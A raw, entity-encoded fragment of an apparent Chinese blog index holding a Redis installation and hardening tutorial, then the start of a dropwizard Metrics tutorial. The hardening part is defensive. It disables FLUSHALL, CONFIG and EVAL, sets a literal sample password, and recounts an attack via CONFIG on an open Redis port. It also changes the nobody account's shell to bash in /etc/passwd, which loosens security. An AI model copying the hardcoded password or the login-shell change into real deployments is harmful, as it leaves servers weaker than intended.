&#x8FC7;key-value&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3002;&#x548C;Memcached&#x7C7B;&#x4F3C;&#xFF0C;&#x5B83;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x7684;value&#x7C7B;&#x578B;&#x76F8;&#x5BF9;&#x66F4;&#x591A;&#xFF0C;&#x5305;&#x62EC;string(&#x5B57;&#x7B26;&#x4E32;)&#x3001;list(&#x94FE;&#x8868;)&#x3001;set(&#x96C6;&#x5408;)&#x3001;zset(sorted set &#x2013;&#x6709;&#x5E8F;&#x96C6;&#x5408;)&#x548C;hashs&#xFF08;&#x54C8;&#x5E0C;&#x7C7B;&#x578B;&#xFF09;&#x3002;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x90FD;&#x652F;&#x6301;push/pop&#x3001;add/remove&#x53CA;&#x53D6;&#x4EA4;&#x96C6;&#x5E76;&#x96C6;&#x548C;&#x5DEE;&#x96C6;&#x53CA;&#x66F4;&#x4E30;&#x5BCC;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#x3002;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;redis&#x652F;&#x6301;&#x5404;&#x79CD;&#x4E0D;&#x540C;&#x65B9;&#x5F0F;&#x7684;&#x6392;&#x5E8F;&#x3002;&#x4E0E;memcached&#x4E00;&#x6837;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6548;&#x7387;&#xFF0C;&#x6570;&#x636E;&#x90FD;&#x662F;&#x7F13;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x533A;&#x522B;&#x7684;&#x662F;redis&#x4F1A;&#x5468;&#x671F;&#x6027;&#x7684;&#x628A;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x6216;&#x8005;&#x628A;&#x4FEE;&#x6539;&#x64CD;&#x4F5C;&#x5199;&#x5165;&#x8FFD;&#x52A0;&#x7684;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#x5B9E;&#x73B0;&#x4E86;master-slave(&#x4E3B;&#x4ECE;)&#x540C;&#x6B65;&#x3002; Redis &#x662F;&#x4E00;&#x4E2A;&#x9AD8;&#x6027;&#x80FD;&#x7684;key-value&#x6570;&#x636E;&#x5E93;&#x3002; redis&#x7684;&#x51FA;&#x73B0;&#xFF0C;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x8865;&#x507F;&#x4E86;memcached&#x8FD9;&#x7C7B;key/value&#x5B58;&#x50A8;&#x7684;&#x4E0D;&#x8DB3;&#xFF0C;&#x5728;&#x90E8; &#x5206;&#x573A;&#x5408;&#x53EF;&#x4EE5;&#x5BF9;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x8D77;&#x5230;&#x5F88;&#x597D;&#x7684;&#x8865;&#x5145;&#x4F5C;&#x7528;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;Python&#xFF0C;Ruby&#xFF0C;Erlang&#xFF0C;PHP&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F7F;&#x7528;&#x5F88;&#x65B9;&#x4FBF;&#x3002;redis&#x7684;&#x5B89;&#x88C5;&#x914D;&#x7F6E;&#xFF0C;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x8BE6;&#x89C1;&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#x3002; &#x5B89;&#x88C5;&#x68C0;&#x67E5;&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x7A0B;&#x5E8F;123yum install gcc-c++yum install -y tclyum install wget &#x83B7;&#x53D6;&#x5B89;&#x88C5;&#x6587;&#x4EF6;1wget http://download.redis.io/releases/redis-2.8.24.tar.gz &#x89E3;&#x538B;&#x6587;&#x4EF6;123tar -xzvf redis-2.8.24.tar.gzmv redis-2.8.24 rediscd redis","keywords":null,"text":"redis&#x7B80;&#x4ECB;redis&#x662F;&#x4E00;&#x4E2A;&#x6027;&#x80FD;&#x975E;&#x5E38;&#x4F18;&#x79C0;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;&#x8FC7;key-value&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3002;&#x548C;Memcached&#x7C7B;&#x4F3C;&#xFF0C;&#x5B83;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x7684;value&#x7C7B;&#x578B;&#x76F8;&#x5BF9;&#x66F4;&#x591A;&#xFF0C;&#x5305;&#x62EC;string(&#x5B57;&#x7B26;&#x4E32;)&#x3001;list(&#x94FE;&#x8868;)&#x3001;set(&#x96C6;&#x5408;)&#x3001;zset(sorted set &#x2013;&#x6709;&#x5E8F;&#x96C6;&#x5408;)&#x548C;hashs&#xFF08;&#x54C8;&#x5E0C;&#x7C7B;&#x578B;&#xFF09;&#x3002;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x90FD;&#x652F;&#x6301;push/pop&#x3001;add/remove&#x53CA;&#x53D6;&#x4EA4;&#x96C6;&#x5E76;&#x96C6;&#x548C;&#x5DEE;&#x96C6;&#x53CA;&#x66F4;&#x4E30;&#x5BCC;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#x3002;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;redis&#x652F;&#x6301;&#x5404;&#x79CD;&#x4E0D;&#x540C;&#x65B9;&#x5F0F;&#x7684;&#x6392;&#x5E8F;&#x3002;&#x4E0E;memcached&#x4E00;&#x6837;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6548;&#x7387;&#xFF0C;&#x6570;&#x636E;&#x90FD;&#x662F;&#x7F13;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x533A;&#x522B;&#x7684;&#x662F;redis&#x4F1A;&#x5468;&#x671F;&#x6027;&#x7684;&#x628A;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x6216;&#x8005;&#x628A;&#x4FEE;&#x6539;&#x64CD;&#x4F5C;&#x5199;&#x5165;&#x8FFD;&#x52A0;&#x7684;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#x5B9E;&#x73B0;&#x4E86;master-slave(&#x4E3B;&#x4ECE;)&#x540C;&#x6B65;&#x3002; Redis &#x662F;&#x4E00;&#x4E2A;&#x9AD8;&#x6027;&#x80FD;&#x7684;key-value&#x6570;&#x636E;&#x5E93;&#x3002; redis&#x7684;&#x51FA;&#x73B0;&#xFF0C;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x8865;&#x507F;&#x4E86;memcached&#x8FD9;&#x7C7B;key/value&#x5B58;&#x50A8;&#x7684;&#x4E0D;&#x8DB3;&#xFF0C;&#x5728;&#x90E8; &#x5206;&#x573A;&#x5408;&#x53EF;&#x4EE5;&#x5BF9;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x8D77;&#x5230;&#x5F88;&#x597D;&#x7684;&#x8865;&#x5145;&#x4F5C;&#x7528;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;Python&#xFF0C;Ruby&#xFF0C;Erlang&#xFF0C;PHP&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F7F;&#x7528;&#x5F88;&#x65B9;&#x4FBF;&#x3002;redis&#x7684;&#x5B89;&#x88C5;&#x914D;&#x7F6E;&#xFF0C;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x8BE6;&#x89C1;&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#x3002; &#x5B89;&#x88C5;&#x68C0;&#x67E5;&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x7A0B;&#x5E8F;123yum install gcc-c++yum install -y tclyum install wget &#x83B7;&#x53D6;&#x5B89;&#x88C5;&#x6587;&#x4EF6;1wget http://download.redis.io/releases/redis-2.8.24.tar.gz &#x89E3;&#x538B;&#x6587;&#x4EF6;123tar -xzvf redis-2.8.24.tar.gzmv redis-2.8.24 rediscd redis &#x5B89;&#x88C5;&#x53CA;&#x7248;&#x672C;&#x67E5;&#x770B;123456#&#x7F16;&#x8BD1;&#x5B89;&#x88C5;makemake install#&#x7248;&#x672C;&#x67E5;&#x770B;redis-server --version &#x8BBE;&#x7F6E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;12mkdir -p /etc/rediscp redis.conf /etc/redis &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;12345vim /etc/redis/redis.conf#&#x4EC5;&#x4FEE;&#x6539;daemonize&#xFF0C;no&#x8BBE;&#x7F6E;&#x4E3A;yes&#xFF0C;&#x6309;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;#&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x3001;&#x591A;&#x5B9E;&#x4F8B;&#x3001;&#x4E3B;&#x4ECE;&#x642D;&#x5EFA;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;daemonize yes &#x542F;&#x52A8;12345/usr/local/bin/redis-server /etc/redis/redis.confps -ef | grep redisroot 8033 1 0 19:36 ? 00:00:00 /usr/local/bin/redis-server *:6379 root 8084 4991 0 19:46 pts/0 00:00:00 grep redis &#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;12345redis-cli&gt;set name davidOK&gt;get name&quot;david&quot; PS&#xFF1A;&#x5982;&#x679C;&#x8981;&#x5378;&#x8F7D;redis&#xFF0C;&#x628A;/usr/local/bin/&#x76EE;&#x5F55;&#x4E0B;&#x7684;redis&#x5220;&#x9664;&#x5373;&#x53EF;&#x3002;&#x4E3A;&#x4E86;&#x5378;&#x8F7D;&#x5E72;&#x51C0;&#xFF0C;&#x4F60;&#x8FD8;&#x53EF;&#x4EE5;&#x628A;&#x89E3;&#x538B;&#x548C;&#x7F16;&#x8BD1;&#x7684;redis&#x5305;&#x53CA;&#x914D;&#x7F6E;&#x7684;redis.conf&#x4E5F;&#x5220;&#x9664;&#x3002; &#x5B89;&#x5168;&#x914D;&#x7F6E;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;redis&#x7684;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x662F;&#x4E0D;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;redis.conf&#x4E2D;&#x8FDB;&#x884C;&#x914D;&#x7F6E;12# vim /etc/redis/redis.confrequirepass CWWmCeM79Sgz2imp &#x6216;&#x8005;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x8BBE;&#x7F6E;1CONFIG set requirepass &quot;CWWmCeM79Sgz2imp&quot; &#x7531;&#x4E8E;Redis&#x7684;&#x6027;&#x80FD;&#x6781;&#x9AD8;&#xFF0C;&#x5E76;&#x4E14;&#x8F93;&#x5165;&#x9519;&#x8BEF;&#x5BC6;&#x7801;&#x540E;Redis&#x5E76;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x4E3B;&#x52A8;&#x5EF6;&#x8FDF;&#xFF08;&#x8003;&#x8651;&#x5230;Redis&#x7684;&#x5355;&#x7EBF;&#x7A0B;&#x6A21;&#x578B;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7A77;&#x4E3E;&#x6CD5;&#x7834;&#x89E3;Redis&#x7684;&#x5BC6;&#x7801;&#xFF08;1&#x79D2;&#x5185;&#x80FD;&#x591F;&#x5C1D;&#x8BD5;&#x5341;&#x51E0;&#x4E07;&#x4E2A;&#x5BC6;&#x7801;&#xFF09;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x8BBE;&#x7F6E;&#x65F6;&#x4E00;&#x5B9A;&#x8981;&#x9009;&#x62E9;&#x590D;&#x6742;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x968F;&#x673A;&#x5BC6;&#x7801;&#x751F;&#x6210;&#x5668;&#x751F;&#x6210;&#x3002; &#x6CE8;&#x610F;&#xFF1A;&#x914D;&#x7F6E;Redis&#x590D;&#x5236;&#x7684;&#x65F6;&#x5019;&#x5982;&#x679C;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x901A;&#x8FC7;masterauth&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x4EE5;&#x4F7F;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x81EA;&#x52A8;&#x4F7F;&#x7528;AUTH&#x547D;&#x4EE4;&#x8BA4;&#x8BC1;&#x3002;&#x8BE6;&#x89C1;&#x672C;&#x7AD9;&#x7684;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x300A;Redis&#x591A;&#x5B9E;&#x4F8B;&#x53CA;&#x4E3B;&#x4ECE;&#x642D;&#x5EFA;&#x300B;&#x3002; &#x7981;&#x6B62;&#x9AD8;&#x5371;&#x547D;&#x4EE4;1234567# vim /etc/redis/redis.confrename-command FLUSHALL &quot;&quot;rename-command CONFIG &quot;&quot;rename-command EVAL &quot;&quot;# &#x4FDD;&#x5B58;&#xFF0C;&#x91CD;&#x542F;redis&#xFF0C;&#x8FDB;&#x5165;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x8F93;&#x5165;flushall&#x7B49;&#x547D;&#x4EE4;&#xFF0C;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x63D0;&#x793A;# (error) ERR unknown command &apos;flushall&apos; &#x66FE;&#x7ECF;&#x6211;&#x7684;&#x6D4B;&#x8BD5;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x751F;&#x8FC7;&#x4E00;&#x6B21;&#x8FD9;&#x6837;&#x7684;&#x4E8B;&#x6545;&#xFF0C;&#x7531;&#x4E8E;&#x5B89;&#x88C5;&#x7684;redis&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;&#xFF0C;&#x88AB;&#x4EBA;&#x901A;&#x8FC7;&#x626B;&#x63CF;ip&#x52A0;&#x9ED8;&#x8BA4;&#x7684;6379&#x7AEF;&#x53E3;&#xFF0C;&#x8FDB;&#x5165;&#x4E86;redis&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;config&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x4E86;&#x6211;&#x7684;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6587;&#x4EF6;&#xFF0C;&#x5BFC;&#x81F4;&#x6240;&#x6709;&#x4EBA;&#x65E0;&#x6CD5;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x3002;&#x6240;&#x4EE5;&#x4E3A;&#x4E86;&#x5B89;&#x5168;&#xFF0C;&#x4F60;&#x8FD8;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4F60;&#x7684;&#x9ED8;&#x8BA4;redis&#x7AEF;&#x53E3;&#x3002;&#x4E8B;&#x6545;&#x8BE6;&#x60C5;&#x89C1;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x300A;&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;&#x300B; &#x7ED1;&#x5B9A;&#x53EA;&#x80FD;&#x672C;&#x673A;&#x8FDE;&#x63A5;Redis&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x4F1A;&#x63A5;&#x53D7;&#x6765;&#x81EA;&#x4EFB;&#x4F55;&#x5730;&#x5740;&#x53D1;&#x9001;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x3002;&#x5373;&#x5728;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x62E5;&#x6709;&#x516C;&#x7F51;IP&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x542F;&#x52A8;Redis&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x88AB;&#x5916;&#x754C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5230;&#x3002; &#x5982;&#x679C;&#x53EA;&#x5141;&#x8BB8;&#x672C;&#x673A;&#x5E94;&#x7528;&#x8FDE;&#x63A5;Redis&#xFF0C;&#x53EF;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x4FEE;&#x6539;bind&#x53C2;&#x6570;&#x3002; 12# vim /etc/redis/redis.confbind 127.0.0.1 &#x4F7F;&#x7528;linux nobody&#x542F;&#x52A8;redis&#x5728;root&#x8D26;&#x6237;&#x4E0B;&#x4F7F;&#x7528;nobody&#x7528;&#x6237;&#x542F;&#x52A8;&#x7A0B;&#x5E8F;xxx&#x7684;&#x65B9;&#x6CD5;&#xFF1A;1su -m nobody -c xxx nobody&#x8D26;&#x6237;&#x9ED8;&#x8BA4;&#x662F;&#x65E0;&#x6CD5;&#x767B;&#x9646;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;su -nobody&#x4F1A;&#x51FA;&#x73B0;1This account is currently not available. &#x9700;&#x8981;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;etc/passwd&#x5B9E;&#x73B0;&#x767B;&#x9646;1234567vim /etc/passwd # &#x627E;&#x5230; nobody:x:99:99:Nobody:/:/sbin/nologin&#xFF0C;&#x6539;&#x6210;&#x5982;&#x4E0B;nobody:x:99:99:Nobody:/:/bin/bash # &#x4FDD;&#x5B58;&#x6267;&#x884C;su -nobody &#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;1echo &quot;/usr/local/bin/redis-server /etc/redis/redis.conf &amp;&quot; &gt;&gt; /etc/rc.local &#x81EA;&#x52A8;&#x5316;&#x90E8;&#x7F72;&#x811A;&#x672C;https://github.com/Wasim37/deployment-scripts/tree/master/redis &#x76F8;&#x5173;&#x94FE;&#x63A5;redis&#x4E2D;&#x6587;&#x5B98;&#x7F51;&#xFF1A;http://doc.redisfans.com/ reids&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;http://redisbook.readthedocs.org/en/latest/index.html redis&#x4F7F;&#x7528;&#x573A;&#x666F;http://www.360doc.com/content/15/0510/20/23016082_469494498.shtml redis conf&#x914D;&#x7F6E;&#x8BE6;&#x89E3;http://www.cnblogs.com/kreo/p/4423362.html","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://www.wangxin123.com/tags/redis/"}]},{"title":"Metrics","slug":"Metrics","date":"2016-09-12T14:10:00.000Z","updated":"2016-11-18T11:47:46.078Z","comments":true,"path":"2016/09/12/Metrics/","link":"","permalink":"http://www.wangxin123.com/2016/09/12/Metrics/","excerpt":"","keywords":null,"text":"&#x7CFB;&#x7EDF;&#x5F00;&#x53D1;&#x5230;&#x4E00;&#x5B9A;&#x7684;&#x9636;&#x6BB5;&#xFF0C;&#x7EBF;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x9664;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x4E1A;&#x52A1;&#x65B9;&#x9762;&#x4E5F;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x3002;Metrics&#x4F5C;&#x4E3A;&#x4E00;&#x6B3E;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x7684;&#x5EA6;&#x91CF;&#x7C7B;&#x5E93;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x8BB8;&#x591A;&#x5DE5;&#x5177;&#x5E2E;&#x52A9;&#x5F00;&#x53D1;&#x8005;&#x6765;&#x5B8C;&#x6210;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x3002; &#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x538B;&#x7F29;&#x670D;&#x52A1;&#xFF1A; &#x6BCF;&#x79D2;&#x949F;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x662F;&#x591A;&#x5C11;&#xFF08;TPS&#xFF09;&#xFF1F; &#x5E73;&#x5747;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x7684;&#x65F6;&#x95F4;&#xFF1F; &#x8BF7;&#x6C42;&#x5904;&#x7406;&#x7684;&#x6700;&#x957F;&#x8017;&#x65F6;&#xFF1F; &#x7B49;&#x5F85;&#x5904;&#x7406;&#x7684;&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x957F;&#x5EA6;&#xFF1F; &#x53C8;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#xFF1A; &#x7F13;&#x5B58;&#x7684;&#x547D;&#x4E2D;&#x7387;&#xFF1F; &#x5E73;&#x5747;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x7684;&#x65F6;&#x95F4;&#xFF1F; &#x57FA;&#x672C;&#x4E0A;&#x6BCF;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x3001;&#x5E94;&#x7528;&#x90FD;&#x9700;&#x8981;&#x505A;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x9700;&#x8981;&#x5C3D;&#x91CF;&#x4EE5;&#x5C11;&#x91CF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5B9E;&#x73B0;&#x7EDF;&#x8BA1;&#x67D0;&#x7C7B;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#x3002; &#x4EE5;Java&#x4E3A;&#x4F8B;&#xFF0C;&#x76EE;&#x524D;&#x6700;&#x4E3A;&#x6D41;&#x884C;&#x7684;metrics&#x5E93;&#x662F;&#x6765;&#x81EA;Coda Hale &#x7684; dropwizard/metrics&#xFF0C;&#x8BE5;&#x5E93;&#x88AB;&#x5E7F;&#x6CDB;&#x5730;&#x5E94;&#x7528;&#x4E8E;&#x5404;&#x4E2A;&#x77E5;&#x540D;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x4E2D;&#x3002;&#x4F8B;&#x5982; Hadoop&#xFF0C;Kafka&#xFF0C;Spark&#xFF0C;JStorm &#x4E2D;&#x3002; &#x672C;&#x6587;&#x5C31;&#x7ED3;&#x5408;&#x8303;&#x4F8B;&#x6765;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x4E0B; dropwizard/metrics &#x7684;&#x6982;&#x5FF5;&#x548C;&#x7528;&#x6CD5;&#x3002; Maven &#x914D;&#x7F6E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;pom.xml&#x4E2D;&#x4F9D;&#x8D56; metrics-core &#x5305;&#xFF1A;1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;io.dropwizard.metrics&lt;/groupId&gt; &lt;artifactId&gt;metrics-core&lt;/artifactId&gt; &lt;version&gt;${metrics.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; &#x6CE8;&#xFF1A;&#x5728;POM&#x6587;&#x4EF6;&#x4E2D;&#x9700;&#x8981;&#x58F0;&#x660E; ${metrics.version} &#x7684;&#x5177;&#x4F53;&#x7248;&#x672C;&#x53F7;&#xFF0C;&#x5982; 3.1.0 Metric RegistriesMetricRegistry&#x7C7B;&#x662F;Metrics&#x7684;&#x6838;&#x5FC3;&#xFF0C;&#x5B83;&#x662F;&#x5B58;&#x653E;&#x5E94;&#x7528;&#x4E2D;&#x6240;&#x6709;metrics&#x7684;&#x5BB9;&#x5668;&#x3002;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x4F7F;&#x7528; Metrics &#x5E93;&#x7684;&#x8D77;&#x70B9;&#x3002; 1MetricRegistry registry = new MetricRegistry(); &#x6BCF;&#x4E00;&#x4E2A; metric &#x90FD;&#x6709;&#x5B83;&#x72EC;&#x4E00;&#x65E0;&#x4E8C;&#x7684;&#x540D;&#x5B57;&#xFF0C;Metrics &#x4E2D;&#x4F7F;&#x7528;&#x53E5;&#x70B9;&#x540D;&#x5B57;&#xFF0C;&#x5982; com.example.Queue.size&#x3002;&#x5F53;&#x4F60;&#x5728; com.example.Queue &#x4E0B;&#x6709;&#x4E24;&#x4E2A; metric &#x5B9E;&#x4F8B;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5730;&#x66F4;&#x5177;&#x4F53;&#xFF1A;com.example.Queue.requests.size &#x548C; com.example.Queue.response.size &#x3002;&#x4F7F;&#x7528;MetricRegistry&#x7C7B;&#xFF0C;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x5730;&#x751F;&#x6210;&#x540D;&#x5B57;&#x3002; 12MetricRegistry.name(Queue.class, &quot;requests&quot;, &quot;size&quot;)MetricRegistry.name(Queue.class, &quot;responses&quot;, &quot;size&quot;) Metrics &#x6570;&#x636E;&#x5C55;&#x793A;Metircs &#x63D0;&#x4F9B;&#x4E86; Report &#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x4E8E;&#x5C55;&#x793A; metrics &#x83B7;&#x53D6;&#x5230;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x3002;metrics-core&#x4E2D;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x56DB;&#x79CD; reporter&#xFF1A; JMX, console, SLF4J, &#x548C; CSV&#x3002; &#x5728;&#x672C;&#x6587;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528; ConsoleReporter &#x3002; &#x4E94;&#x79CD; Metrics &#x7C7B;&#x578B;Gauges&#x6700;&#x7B80;&#x5355;&#x7684;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x60F3;&#x8861;&#x91CF;&#x4E00;&#x4E2A;&#x5F85;&#x5904;&#x7406;&#x961F;&#x5217;&#x4E2D;&#x4EFB;&#x52A1;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;1234567891011121314151617181920212223public class GaugeTest { public static Queue&lt;String&gt; q = new LinkedList&lt;String&gt;(); public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); registry.register(MetricRegistry.name(GaugeTest.class, &quot;queue&quot;, &quot;size&quot;), new Gauge&lt;Integer&gt;() { public Integer getValue() { return q.size(); } }); while(true){ Thread.sleep(1000); q.add(&quot;Job-xxx&quot;); } }} &#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;123-- Gauges ------------------------------------------------com.alibaba.wuchong.metrics.GaugeTest.queue.size value = 6 &#x5176;&#x4E2D;&#x7B2C;7&#x884C;&#x548C;&#x7B2C;8&#x884C;&#x6DFB;&#x52A0;&#x4E86;ConsoleReporter&#xFF0C;&#x53EF;&#x4EE5;&#x6BCF;&#x79D2;&#x949F;&#x5C06;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#x6253;&#x5370;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#xFF0C;&#x7406;&#x89E3;&#x8D77;&#x6765;&#x4F1A;&#x66F4;&#x6E05;&#x695A;&#x3002; 